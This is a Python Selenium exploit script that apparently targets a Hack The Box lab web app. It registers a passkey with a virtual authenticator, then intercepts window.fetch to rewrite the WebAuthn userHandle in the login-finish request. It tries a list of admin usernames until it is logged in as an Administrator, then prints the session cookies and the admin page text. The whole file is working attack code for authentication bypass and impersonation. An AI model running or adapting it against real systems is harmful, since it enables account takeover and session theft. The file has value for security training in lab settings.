#!/usr/bin/env python3
import json
import sys
import time

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.virtual_authenticator import VirtualAuthenticatorOptions


origin = "http://aegis.korvia.htb:3000"
invite_token = sys.stdin.readline().strip()
if not invite_token:
    raise SystemExit("invite token required on stdin")

chrome_options = Options()
chrome_options.binary_location = "/usr/bin/chromium"
chrome_options.add_argument("--headless=new")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--no-proxy-server")
chrome_options.add_argument(f"--unsafely-treat-insecure-origin-as-secure={origin}")

driver = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=chrome_options)
try:
    authenticator_options = VirtualAuthenticatorOptions()
    authenticator_options.protocol = VirtualAuthenticatorOptions.Protocol.CTAP2
    authenticator_options.transport = VirtualAuthenticatorOptions.Transport.INTERNAL
    authenticator_options.has_resident_key = True
    authenticator_options.has_user_verification = True
    authenticator_options.is_user_consenting = True
    authenticator_options.is_user_verified = True
    driver.add_virtual_authenticator(authenticator_options)

    driver.get(origin + "/login")
    registration = driver.execute_async_script(
        """
        const token = arguments[0];
        const done = arguments[arguments.length - 1];
        AegisWebAuthn.register(token)
          .then(value => done({ok: true, value}))
          .catch(error => done({ok: false, error: String(error)}));
        """,
        invite_token,
    )
    if not registration.get("ok"):
        print(json.dumps({"registration": registration}, indent=2))
        raise SystemExit(1)

    attempts = []
    authenticated = None
    candidates = ["admin", "administrator", "webadmin", "r.kova", "ao-mreyes"]
    for handle in candidates:
        authentication = driver.execute_async_script(
            """
            const overrideHandle = arguments[0];
            const done = arguments[arguments.length - 1];
            const originalFetch = window.fetch.bind(window);
            window.fetch = function(url, options) {
              if (String(url).endsWith('/api/v1/auth/webauthn/auth/finish')) {
                const updated = Object.assign({}, options || {});
                const body = JSON.parse(updated.body || '{}');
                const bytes = new TextEncoder().encode(overrideHandle);
                let binary = '';
                bytes.forEach(byte => binary += String.fromCharCode(byte));
                body.response.userHandle = btoa(binary)
                  .replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');
                updated.body = JSON.stringify(body);
                return originalFetch(url, updated);
              }
              return originalFetch(url, options);
            };
            AegisWebAuthn.authenticate()
              .then(value => {
                window.fetch = originalFetch;
                done({ok: true, value});
              })
              .catch(error => {
                window.fetch = originalFetch;
                done({ok: false, error: String(error)});
              });
            """,
            handle,
        )
        attempts.append({"handle": handle, "result": authentication})
        if authentication.get("ok"):
            authenticated = authentication
            if authentication.get("value", {}).get("role") == "Administrator":
                break

    if not authenticated:
        print(json.dumps({"registration": registration, "attempts": attempts}, indent=2))
        raise SystemExit(1)

    driver.get(origin + "/admin/approvals")
    time.sleep(0.5)
    cookie_header = "; ".join(
        f"{cookie['name']}={cookie['value']}" for cookie in driver.get_cookies()
    )
    result = {
        "registration": registration,
        "attempts": attempts,
        "current_url": driver.current_url,
        "title": driver.title,
        "cookie_header": cookie_header,
        "body_text": driver.find_element("tag name", "body").text[:16000],
    }
    print(json.dumps(result, indent=2))
finally:
    driver.quit()
